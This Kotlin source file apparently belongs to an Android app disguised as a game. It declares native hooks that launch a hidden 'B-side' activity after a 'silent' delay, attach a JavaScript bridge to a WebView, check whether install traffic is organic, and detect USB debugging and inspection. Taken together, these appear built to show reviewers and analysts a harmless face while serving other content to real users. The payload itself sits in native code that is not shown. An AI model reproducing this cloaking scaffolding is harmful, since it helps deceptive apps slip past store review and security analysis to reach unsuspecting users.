package eggy.game.core

import android.content.Context
import android.webkit.WebView
import androidx.annotation.Keep
import eggy.game.activity.BActivity
import eggy.game.sdk.ShellSDK
import eggy.game.util.Device

@Keep
internal object JniBridge {

    //启动B面Activity的包类名
    val LAUNCHER = BActivity::class.java.name

    //js交互接口
    val BRIDGE = JavaScriptBridge::class.java.name

    //app打包时间
    var mReleaseTime = 0L

    // target
    var mTarget = ""

    //静默时间
    var mDelayTime = 0L

    init {
        System.loadLibrary("eggytools")
    }

    external fun init(isLoggable: Boolean)

    external fun canInspect(): Boolean

    external fun isOrganicTraffic(referrer: String): Boolean

    external fun equalsKey(key: String?): Boolean

    external fun checkKey(): Boolean

    external fun launcher(context: Context)

    external fun launcherView(context: Context, name: String, key: String, value: String)

    external fun instanceSDK(key: String?): Array<Any>?

    external fun addBridge(context: Context, view: WebView): JavaScriptBridge

    external fun released(view: WebView)

    fun isUsbDebuggingEnabled(): Boolean {
        return if (ShellSDK.mIsUsbDebuggingEnabled)
            Device.isUsbDebuggingEnabled()
        else
            false
    }
}